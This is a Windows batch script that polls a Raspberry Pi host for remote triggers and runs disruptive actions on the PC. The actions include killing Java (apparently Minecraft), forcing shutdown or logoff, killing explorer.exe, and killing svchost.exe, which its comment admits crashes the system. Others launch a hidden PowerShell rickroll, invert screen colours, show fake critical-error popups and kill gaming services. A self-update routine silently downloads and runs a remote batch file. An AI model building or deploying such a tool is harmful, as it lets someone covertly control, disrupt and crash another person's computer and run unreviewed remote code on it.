@echo off
setlocal enabledelayedexpansion

:loop
REM Check Trigger 1
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger1') do set HTTP_CODE=%%i
echo Trigger 1 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-1
)

REM Check Trigger 2
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger2') do set HTTP_CODE=%%i
echo Trigger 2 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-2
)

REM Check Trigger 3
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger3') do set HTTP_CODE=%%i
echo Trigger 3 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-3
)

REM Check Trigger 4
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger4') do set HTTP_CODE=%%i
echo Trigger 4 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-4
)

REM Check Trigger 5
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger5') do set HTTP_CODE=%%i
echo Trigger 5 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-5
)

REM Check Trigger 6
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger6') do set HTTP_CODE=%%i
echo Trigger 6 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-6
)

REM Check Trigger 7
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger7') do set HTTP_CODE=%%i
echo Trigger 7 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-7
)

REM Check Trigger 8
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger8') do set HTTP_CODE=%%i
echo Trigger 8 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-8
)

REM Check Trigger 9
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger9') do set HTTP_CODE=%%i
echo Trigger 9 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-9
)

REM Check Trigger 10
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger10') do set HTTP_CODE=%%i
echo Trigger 10 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-10
)

REM Check Trigger 11
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger11') do set HTTP_CODE=%%i
echo Trigger 11 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-11
)

REM Check Trigger 12
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger12') do set HTTP_CODE=%%i
echo Trigger 12 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-12
)

REM Check Trigger 13
for /f "delims=" %%i in ('curl -s -o nul -w "%%{http_code}" http://pi-bot.local:8080/trigger13') do set HTTP_CODE=%%i
echo Trigger 13 HTTP_CODE: %HTTP_CODE%
if "%HTTP_CODE%"=="200" (
    call :do-something-13
)

timeout /t 5
goto loop

:do-something-1
echo Aktion 1 ausgefuehrt!
REM Hier kommt der Code, der fuer Trigger 1 ausgefuehrt werden soll
tasklist /fi "ImageName eq javaw.exe" /fo csv 2>NUL | find /I "javaw.exe">nul
if %ERRORLEVEL% equ 0 (
    set "java_running=1"
) else (
    set "java_running=0"
)
if %java_running% equ 1 (
    call :kill
) else (
    echo no kill
    timeout /t 10 /nobreak > nul
)
goto :eof

:do-something-2
echo Aktion 2 ausgefuehrt!
REM Hier kommt der Code, der fuer Trigger 2 ausgefuehrt werden soll
shutdown /p
goto :eof

:do-something-3
REM hopefully a self updating version using github ;D
echo Aktion 3 ausgefuehrt!
REM Hier kommt der Code, der fuer Trigger 3 ausgefuehrt werden soll
call :self.update
goto :eof

:do-something-4
REM idk, probably logout or so
echo Aktion 4 ausgefuehrt!
REM Here goes the code for trigger 4
shutdown /l
goto :eof

:do-something-5
REM rickroll or so, use at own risk
echo Aktion 5 ausgefuehrt!
REM Hier kommt der Code, der fuer Trigger 3 ausgefuehrt werden soll
powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/dQw4w9WgXcQ?si=w2bQSkBFMbZRp8EY;sleep 5;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
goto :eof

:do-something-6
REM terminates explorer.exe, meaning the explorer, taskbar and desktop icons will close/dissapear
echo Aktion 6 ausgefuehrt!
REM here goes the code \/  (everything returns to normal after reboot)
taskkill /IM explorer.exe /F
goto :eof

:do-something-7
REM kills svchost.exe (might be critical) (edit: CRASHES THE SYSTEM!!!)
echo Aktion 7 ausgefuehrt!
REM Here goes the code for trigger 7
taskkill /IM svchost.exe /F
goto :eof

:do-something-8
REM presses the ESC key
echo Aktion 8 ausgefuehrt!
REM Here goes the code for trigger 8
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{ESCAPE}')"
goto :eof

:do-something-9
REM inverts screen color (restart to undo)
echo Aktion 9 ausgefuehrt!
REM Here goes the code for trigger 9
powershell.exe -Command "(Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool SetSysColors(int cElements, int[] lpaElements, int[] lpaRgbValues);' -Name Win32SetSysColors -Namespace Win32Functions -PassThru)::SetSysColors(1, [int[]]@(0x00FFFFFF), [int[]]@(0x00000000))"
goto :eof

:do-something-10
REM create fake error message
echo Aktion 10 ausgefuehrt!
REM Here goes the code for trigger 10
mshta.exe "javascript:alert('This is a fake error message!');close();"
REM feel free to customize to your liking ;)
goto :eof

:do-something-11
REM verry real system error ;D
echo Aktion 11 ausgefuehrt!
REM Here goes the code for trigger 11
mshta.exe "javascript:alert('Critical System Error\nReboot this Computer immediately');close();"
goto :eof

:do-something-12
REM moves the mouse
echo Aktion 12 ausgefuehrt!
REM Here goes the code for trigger 12
rundll32 user32.dll,SetCursorPos
goto :eof

:do-something-13
REM spam kills the gaming services
echo Aktion 13 ausgefuehrt!
REM Here goes the code for trigger 13
taskkill /IM GamingServices.exe /F
taskkill /IM GamingServices.exe /F
taskkill /IM GamingServices.exe /F
taskkill /IM GamingServices.exe /F
taskkill /IM GamingServices.exe /F
goto :eof


:self.update
cd %temp%
mkdir permanent
cd permanent
curl -O https://raw.githubusercontent.com/Easty101/bat-anti-java/main/V2/update.bat
start C:\path\to\SilentCMD\SilentCMD.exe %temp%\permanent\update.bat
REM !Change 'C:\path\to\SilentCMD\SilentCMD.exe' to your actual path! ################################################################
goto :eof

:kill
echo kill
taskkill /f /im javaw.exe >nul
timeout /t 5 /nobreak > nul
echo timer done
goto :eof
